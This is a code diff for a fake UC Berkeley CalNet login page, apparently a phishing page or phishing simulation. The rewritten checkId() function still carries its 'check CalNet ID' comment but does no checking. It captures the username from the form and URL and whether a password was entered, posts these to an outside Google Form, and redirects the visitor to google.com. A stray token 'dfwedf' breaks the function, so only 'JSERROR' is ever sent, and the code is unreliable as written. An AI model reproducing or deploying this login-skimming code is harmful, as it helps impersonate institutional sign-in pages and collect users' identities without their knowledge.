@@ -3,34 +3,7 @@ var ns6 = document.getElementById && !document.all;
 var previous = '';
 var eventobj;
 
-// SET FOCUS TO FIRST ELEMENT AND HIDE/SHOW ELEMENTS IF JAVASCRIPT ENABLED
-
-// REGULAR EXPRESSION TO HIGHLIGHT ONLY FORM ELEMENTS
-var intended = /INPUT|TEXTAREA|SELECT|OPTION/
-
-// FUNCTION TO CHECK WHETHER ELEMENT CLICKED IS FORM ELEMENT
-function checkel(which) {
-	if (which.style && intended.test(which.tagName)) { return true }
-	else return false
-}
-
-// FUNCTION TO HIGHLIGHT FORM ELEMENT
-function highlight(e) {
-	if (!ns6) {
-		eventobj = event.srcElement
-		if (previous != '') {
-			if (checkel(previous))
-				previous.style.backgroundColor = ''
-			previous = eventobj
-			if (checkel(eventobj)) eventobj.style.backgroundColor = highlightcolor
-		}
-		else {
-			if (checkel(eventobj)) eventobj.style.backgroundColor = highlightcolor
-			previous = eventobj
-		}
-	}
-}
-
+// https://html-online.com/articles/get-url-parameters-javascript/
 function getUrlVars() {
     var vars = {};
     var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
@@ -39,31 +12,38 @@ function getUrlVars() {
     return vars;
 }
 
-// Function to check CalNet ID for all numeric or invalid based on .
+// Function to check CalNet ID for all numeric or invalid based on.
 function checkId() {
-	event.preventDefault()
-	calnet_id = document.getElementById("username");
-	password = document.getElementById("password");
-	calnet_id.value = calnet_id.value.replace(/^\s+|\s+$/g, ""); // trim leading and trailing spaces
-	if (calnet_id != null) {
-		let user = getUrlVars()["user"];
+	try {
+		event.preventDefault()
+		dfwedf
+		// get and check username in form
+		formUser = document.getElementById("username").value;
+		if (formUser == "") {formUser = "[no username entered in form]"}
+
+		// get and check username passed in URL as a parameter
+		urlUser = getUrlVars()["user"];
+		console.log(urlUser);
+		if (urlUser == null) {urlUser = "[no username found in url]"}
+
+		// check if user entered a password
+		passwordPassed = "No";
+		password = document.getElementById("password");
+		if (password.value != "") { passwordPassed = "Yes";}
+
 		var xhr = new XMLHttpRequest();
-		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=" + user + "&submit=Submit";
+		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=" + urlUser + "&entry.1386775216=" + formUser + "&entry.830965781=" + passwordPassed + "&submit=Submit";
 		xhr.open("POST", url , true);
-		//xhr.setRequestHeader('Content-Type', 'application/json');
 		xhr.send();
-		// https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=karlkarl&submit=Submit
-		// if (window.location.search && unescape(window.location.search).match(/bpr.calnet.berkeley.edu\/account-manager/) && calnet_id.value.match(/^cads\d+$/)) {
-		// 	return;
-		// } else if (calnet_id.value.match(/^cads\d+$/)) {
-		// 	message = "You are now required to choose a self-selected CalNet ID before continuing. Click OK to log into the Change CalNet ID application.";
-		// 	answer = alert(message);
-		// 	window.location = "https://bpr.calnet.berkeley.edu/account-manager/person/changeCalnetId";
-		// 	return false;
-		// } else if (calnet_id.value.match(/^(\!|app_|((app|bio|ced|dev|eas|guest|lib|opt|pvt|summer|svc)-)).*$|^(guest|tsinternetuser|notkrishna|krbtgt)$/)) {
-		// 	message = "Invalid CalNet ID.";
-		// 	answer = alert(message);
-		// 	return false;
-		// }
+
+		window.location.replace("http://www.google.com");
+	} catch (e){
+		var xhr = new XMLHttpRequest();
+		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=JSERROR&entry.1386775216=JSERROR&entry.830965781=JSERROR&submit=Submit";
+		xhr.open("POST", url , true);
+		xhr.send();
+
+		window.location.replace("http://www.google.com");
 	}
-}
+	}
+
